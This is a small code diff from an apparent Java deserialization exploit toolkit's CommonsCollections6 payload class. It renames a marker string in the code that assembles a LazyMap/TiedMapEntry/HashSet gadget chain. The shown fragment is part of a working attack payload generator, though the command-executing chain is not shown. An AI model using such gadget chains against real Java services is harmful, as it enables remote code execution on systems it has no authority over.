@@ -42,9 +42,9 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "nu1r");
         HashSet map = new HashSet(1);
-        map.add("su18");
+        map.add("nu1r");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
